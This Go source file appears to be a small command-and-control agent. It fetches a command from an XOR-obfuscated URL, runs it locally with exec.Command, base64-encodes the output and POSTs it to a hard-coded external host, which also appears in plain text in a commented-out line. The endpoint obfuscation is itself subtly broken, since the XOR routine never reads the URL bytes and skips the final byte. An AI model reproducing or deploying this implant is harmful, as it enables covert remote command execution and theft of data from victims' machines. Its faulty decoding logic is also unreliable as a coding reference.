package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

type Post struct {
	Message string `json:"message"`
}

func getCmd(url string) []string {
	resp, err := http.Get(url)
	if err != nil {
		log.Fatalln(err)
	}

	resBody, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error: %s", err)
	}

	args := strings.Split(string(resBody), " ")

	return args
}

func execCmd(args []string) []byte {
	cmd := exec.Command(args[0], args[1:]...)
	out, err := cmd.Output()
	if err != nil {
		fmt.Println(cmd)
		fmt.Println("Error running command: ", err)
	}

	return out
}

func postOut(reader io.Reader) {
	_, err := http.Post("https://phalerum.stickybits.red/api/v1/agents/test", "application/json", reader)
	if err != nil {
		log.Fatal(err)
	}
}

func encodeOutput(output []byte) string {
	sEnc := base64.StdEncoding.EncodeToString([]byte(string(output)))

	return sEnc
}

func xorURL(url string, key []byte) string {
	xorResult := make([]byte, len(url))
	for i := 0; i < len(url)-1; i++ {
		xorResult[i] ^= key[i%len(key)]
	}
	return string(xorResult)
}

func main() {
	//url := "https://phalerum.stickybits.red/api/v1/agents/test"
	url := "\\xb1\\xc6?1.?A\\xd2\\xf9\\xac \\xb3\\x889\\xf5\\x08\\x1a\\xe3\\x99\\xaf\\xd7\\x0c\\xea\\xc94b\\x118\\x9b\\xcf\\xc5,\\xf2-/i[\\x9b1q1\\xf6\\x90\\xa5\\x91\\xff\\xa1u\\xebt"
	key := []byte{0xd9, 0xb2, 0x4b, 0x41, 0x5d, 0x05, 0x6e, 0xfd, 0x89, 0xc4, 0x41, 0xdf, 0xed, 0x4b, 0x80, 0x65, 0x34, 0x90, 0xed, 0xc6, 0xb4, 0x67, 0x93, 0xab, 0x5d, 0x16, 0x62, 0x16, 0xe9, 0xaa, 0xa1, 0x03, 0x93, 0x5d, 0x46, 0x46, 0x2d, 0xaa, 0x1e, 0x10, 0x56, 0x93, 0xfe, 0xd1, 0xe2, 0xd0, 0xd5, 0x10, 0x98, 0xed, 0x5a, 0x19, 0x55, 0x1b, 0x1e, 0x88, 0x3e, 0x41, 0x31, 0x92, 0x22, 0x70, 0x9c, 0x1a}

	args := getCmd(xorURL(url, key))
	out := execCmd(args)

	jsonBody := Post{
		Message: encodeOutput(out),
	}

	bodyBytes, err := json.Marshal(&jsonBody)
	if err != nil {
		log.Fatal(err)
	}

	reader := bytes.NewReader(bodyBytes)

	postOut(reader)

}
